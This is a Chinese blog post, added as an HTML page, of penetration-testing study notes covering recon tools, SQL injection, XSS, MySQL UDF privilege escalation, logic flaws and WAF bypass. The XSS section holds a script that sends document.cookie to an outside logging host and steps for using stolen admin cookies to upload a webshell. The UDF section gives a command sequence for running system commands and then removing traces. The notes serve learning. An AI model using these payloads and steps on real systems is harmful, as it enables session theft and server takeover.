@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Hind:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试学习笔记">
+<meta property="og:url" content="http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="fxxy">
+<meta property="og:description" content="笔记。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200629195512778.png">
+<meta property="article:published_time" content="2020-04-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-22T08:35:17.659Z">
+<meta property="article:author" content="fxxy">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200629195512778.png">
+
+<link rel="canonical" href="http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透测试学习笔记 | fxxy</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="fxxy" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">fxxy</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">19</span></a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.png">
+      <meta itemprop="name" content="fxxy">
+      <meta itemprop="description" content="力争下游。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fxxy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透测试学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-30 00:00:00" itemprop="dateCreated datePublished" datetime="2020-04-30T00:00:00+08:00">2020-04-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-22 16:35:17" itemprop="dateModified" datetime="2021-10-22T16:35:17+08:00">2021-10-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>笔记。<span id="more"></span></p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
+<li><p>前期交互</p>
+<ul>
+<li>确定项目机范围</li>
+</ul>
+</li>
+<li><p>信息收集</p>
+<ul>
+<li>收集目标相关的资产信息，包括域名、IP、邮箱、防御等</li>
+</ul>
+</li>
+<li><p>威胁建模</p>
+<ul>
+<li>利用已经收集的信息对目标资产进行分析，获取其可能存在的威胁，并规划攻击路径</li>
+</ul>
+</li>
+<li><p>漏洞分析</p>
+<ul>
+<li>发现目标系统中存在的漏洞</li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li>对已发现的漏洞使用攻击向量进行攻击</li>
+</ul>
+</li>
+<li><p>后渗透</p>
+<ul>
+<li>建立立足点，进行权限维持以及内网渗透，获取指定的渗透目标数据，权限等。清理痕迹</li>
+</ul>
+</li>
+<li><p>报告</p>
+<ul>
+<li>编写渗透测试报告</li>
+</ul>
+</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集的越多，意味着攻击的范围越广</p>
+<p>常见关键信息</p>
+<ul>
+<li>域名、子域名</li>
+<li>IP及端口</li>
+<li>域名历史解析IP</li>
+<li>应用服务系统、版本</li>
+<li>开源情报</li>
+<li>服务端框架，语言</li>
+<li>IP反向查询域名</li>
+</ul>
+<h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>内置在kali中</p>
+<p>Maltego：<a target="_blank" rel="noopener" href="https://www.paterva.com/">https://www.paterva.com</a></p>
+<p>Maltego 教程：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/93ab0265375b">https://www.jianshu.com/p/93ab0265375b</a></p>
+<p>Recon-Ng：<a target="_blank" rel="noopener" href="https://bitbucket.org/LaNMaSteR53/recon-ng.git">https://bitbucket.org/LaNMaSteR53/recon-ng.git</a></p>
+<p>Recon-Ng 教程：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/141544.html">https://www.freebuf.com/sectool/141544.html</a></p>
+<p>theHarvester：<a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>
+<p>theHarvester 教程：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/47698">https://cloud.tencent.com/developer/news/47698</a></p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>主要以下四个方面</p>
+<ul>
+<li>传统漏洞</li>
+<li>利用通用漏洞</li>
+<li>弱口令等目标脆弱点</li>
+<li>代码审计</li>
+</ul>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul>
+<li>寻找注入点</li>
+<li>注入方式</li>
+</ul>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>bluecms</p>
+<ul>
+<li>找后台<ul>
+<li>手工：admin、manage</li>
+<li>工具：御剑</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200629195512778.png" alt="image-20200629195512778"></p>
+<ul>
+<li>&lt;img/src=x&gt;</li>
+<li><code>&lt;svg/onload=x &gt;</code></li>
+<li><script> alert(1)<script></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src =&quot;http://www.domin.com?log.php?c=&quot; + encodeURI(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过长度限制</p>
+<ul>
+<li><h2 id="引入外部脚本"><a href="#引入外部脚本" class="headerlink" title="引入外部脚本"></a><img src="" alt="img">引入外部脚本</h2></li>
+<li>短链接<ul>
+<li>dwz.cn</li>
+</ul>
+</li>
+</ul>
+<p>步骤</p>
+<ul>
+<li>发现xss利用点</li>
+<li>构造xss paload获取管理员cookie</li>
+<li>利用管理员cookie进行管理页面登录</li>
+<li>登陆后后台查看有无上传文件权限进行webshell上传</li>
+</ul>
+<p>另外可借助一些XSS平台监听放的【钓鱼链接】</p>
+<h3 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h3><p>mysql</p>
+<ul>
+<li>写webshell select into outfile</li>
+<li>UDF提权</li>
+<li>MOF提权</li>
+<li>配置phpmyadmin日志获取webshell<ul>
+<li>general log</li>
+<li>general log file 记录sql查询记录，默认在./data目录下</li>
+</ul>
+</li>
+</ul>
+<p>sqlserver</p>
+<ul>
+<li>存储过程执行命令</li>
+</ul>
+<p>sql写入webshell条件</p>
+<ul>
+<li>当前数据库用户有文件读写权限<ul>
+<li>须配置 secure_file_priv</li>
+<li></li>
+</ul>
+</li>
+<li>知道绝对路径且可写可执行</li>
+<li>单双引号可以正常使用</li>
+</ul>
+<p>获取绝对路径方式</p>
+<ul>
+<li>报错信息</li>
+<li>phpinfo、探针等文件</li>
+<li>常规目录</li>
+</ul>
+<p>练习：blucms admin/nav.php</p>
+<p>若文件夹无可写权限，可通过文件上传寻找可写入路径</p>
+<ul>
+<li>hex编码绕过，这样可不用引号把内容括起来</li>
+</ul>
+<p>练习靶场</p>
+<p><a target="_blank" rel="noopener" href="http://47.106.80.112:8235/">http://47.106.80.112:8235/</a></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>目录扫描工具</p>
+<ul>
+<li>御剑</li>
+<li>OWASP dirbrute</li>
+<li>burpsuite</li>
+<li>webpathbrute</li>
+</ul>
+<p>mysql提权</p>
+<ul>
+<li>UDF提权</li>
+<li>MOF提权</li>
+<li>UDF提权</li>
+</ul>
+<p>实战5：udf提权</p>
+<ul>
+<li>Userdefined Function：是用户自定义函数，mysql为用户提供的一个扩展功能的接口，用户可以通过编写代码的方式编译成.so.dll文件，使用自定义函数</li>
+<li>使用条件<ul>
+<li>mysql &gt; 5.1</li>
+<li>.so .dll文件必须放在mysql的plugin目录下</li>
+<li>有create function权限</li>
+</ul>
+</li>
+</ul>
+<p>获取plugin目录：@@plugin_dir</p>
+<p>此种方法Windows下易用</p>
+<p>工具地址：lib_mysqludf_sys：<a target="_blank" rel="noopener" href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p>
+<ul>
+<li>先将仓库clone到本地</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mysqludf/lib_mysqludf_sys</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成exp</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -l /www/mysql/include -Os -shared lib_mysqludf_sys.c -fPIC -o udf.so</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将生成的文件十六进制编码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;/tmp/udf.so&#x27;))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取plugin目录</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>写入内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#x27;第三步hex的内容&#x27;) into dump file &#x27;plugin_dir/udf.so&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行函数声明与udf.so相关联</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;udf.so&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;pwd&#x27;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>痕迹销毁</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval</span><br></pre></td></tr></table></figure>
+
+<h4 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h4><ul>
+<li>定时任务</li>
+<li>写入ssh</li>
+</ul>
+<h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3><p>逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，而导致一些逻辑分支不能够正常处理或处理错误。</p>
+<p>一般有以下几种情况</p>
+<ul>
+<li>密码找回</li>
+<li>任意密码修改（没有旧密码认证）</li>
+<li>越权访问</li>
+<li>API调用</li>
+<li>交易支付过程</li>
+<li>……</li>
+</ul>
+<h4 id="权限控制类"><a href="#权限控制类" class="headerlink" title="权限控制类"></a>权限控制类</h4><h5 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h5><ul>
+<li>相同权限用户之间的操作权限控制不当</li>
+<li>一个正常的用户a通常只能对自己的信息进行修改，但由于<strong>系统未对信息修改进行一个判断，判断当前操作是否属于对应的用户的操作</strong>，导致用户a可以操作其他人的信息。</li>
+<li>防护：增加访问与操作对象的用户属性，在对目标对象进行访问与操作时，服务端校验会话与对象的用户属性，在校验通过后才能执行读取和操作。</li>
+</ul>
+<h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><ul>
+<li>不同权限用户之间权限控制不当，多发生再低权限用户访问高权限用户资源</li>
+<li>例子：在博客论坛中，一个正常的普通用户a，通过burpsuite抓包修改自己的用户ID为管理员的用户ID，使其成功登录了管理员的帐号。</li>
+<li>防护：所有访问采取默认拒绝机制，采取基于角色访问控制，对于各个功能的访问，规定不同角色拥有不同的访问权限，当用户在使用该功能时，系统要校对用户的权限和访问控制机制是否与规定相同，通过校对者才能使用，否则拒绝使用该功能。</li>
+</ul>
+<h5 id="接口控制"><a href="#接口控制" class="headerlink" title="接口控制"></a>接口控制</h5><ul>
+<li>特殊接口没有做访问权限控制</li>
+<li>例子：在博客论坛中，一个正常的普通用户a使用官方提供的API接口构造链接，用户b通过点击该链接后进行发送或转发用户a指定的内容。</li>
+<li>接口类漏洞大多数都是因为接口没有做验证或者其他预防机制，导致被攻击者所利用，比如一些下载链接接口导致未授权下载，登录接口无验证导致撞库等等。</li>
+</ul>
+<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><ul>
+<li>基础安全架构，完善用户权限体系。要知道哪些数据对于哪些用户，哪些数据不应该由哪些用户操作</li>
+<li>鉴权，服务端对请求的数据和当前用户身份做校验</li>
+<li>不要直接使用对象的实名或关键字</li>
+<li>对于可控参数进行严格的检查与过滤</li>
+</ul>
+<h4 id="密码修改找回类"><a href="#密码修改找回类" class="headerlink" title="密码修改找回类"></a>密码修改找回类</h4><p><a target="_blank" rel="noopener" href="https://untitled-0on9w2imekga.runkit.sh/login">https://untitled-0on9w2imekga.runkit.sh/login</a>?</p>
+<p>正常逻辑下，密码重置、密码找回需要以下三个条件</p>
+<ul>
+<li>用户名</li>
+<li>身份证号码</li>
+<li>手机短信验证码</li>
+</ul>
+<p>然而某些验证不严密的，身份证号和手机短信验证码均可绕过，只需要知道用户名就可以重置任意用户密码</p>
+<ul>
+<li>凭证可破解<ul>
+<li>利用点：爆破验证码</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://untitled-tthv7pk5xegg.runkit.sh/index">https://untitled-tthv7pk5xegg.runkit.sh/index</a>?</p>
+<ul>
+<li>凭证可获取</li>
+</ul>
+<p>开发人员将验证信息包含在响应包中</p>
+<ul>
+<li>token可猜解</li>
+<li>前端校验</li>
+</ul>
+<p>在前端进行验证，相当于没有进行任何防范措施，比如登陆状态如果只以登陆状态码进行判断登陆成功标识，那么修改登陆状态码就能进行登录。</p>
+<p>前端包含对验证码的校验flag，可控</p>
+<ul>
+<li>步骤可跳过</li>
+</ul>
+<p>通过跳过某些关键步骤来达到修改别人密码的目的。</p>
+<h4 id="支付逻辑类"><a href="#支付逻辑类" class="headerlink" title="支付逻辑类"></a>支付逻辑类</h4><ul>
+<li>支付过程中可以直接修改数据包中的支付金额</li>
+<li>没有对购买数量进行复数限制</li>
+<li>请求重放：通过多线程同一时间发送大量请求，当数据库未加锁时出错（条件竞争）</li>
+<li>参数干扰：优惠券，同一代金券重复使用，为满足条件使用代金券</li>
+</ul>
+<h2 id="通用漏洞"><a href="#通用漏洞" class="headerlink" title="通用漏洞"></a>通用漏洞</h2><ul>
+<li>定义：企业及互联网中常用的操作系统，系统组件，重要的框架以及应用中的安全漏洞</li>
+<li>PoC：指一段漏洞证明的代码</li>
+</ul>
+<p>CMS识别：云溪</p>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>分类</p>
+<ul>
+<li>云WAF</li>
+<li>CDN WAF</li>
+<li>主机WAF</li>
+</ul>
+<p>绕过思路</p>
+<p>云waf cdn WAF绕过：尝试直接访问主站</p>
+<p>主机WAF：通过内容绕过</p>
+<p>大小写 内联注释 换行符</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/14/vue%E7%AC%94%E8%AE%B0/" rel="prev" title="vue笔记">
+      <i class="fa fa-chevron-left"></i> vue笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/10/buuctf%E5%88%B7%E9%A2%98/" rel="next" title="BUUctf平台">
+      BUUctf平台 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.</span> <span class="nav-text">自动化工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">4.2.</span> <span class="nav-text">XSS</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fxxy"
+      src="/images/logo.png">
+  <p class="site-author-name" itemprop="name">fxxy</p>
+  <div class="site-description" itemprop="description">力争下游。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fxxy-xx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fxxy-xx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2420225660@qq.com" title="E-Mail → mailto:2420225660@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fxxy</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'dark',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+</body>
+</html>
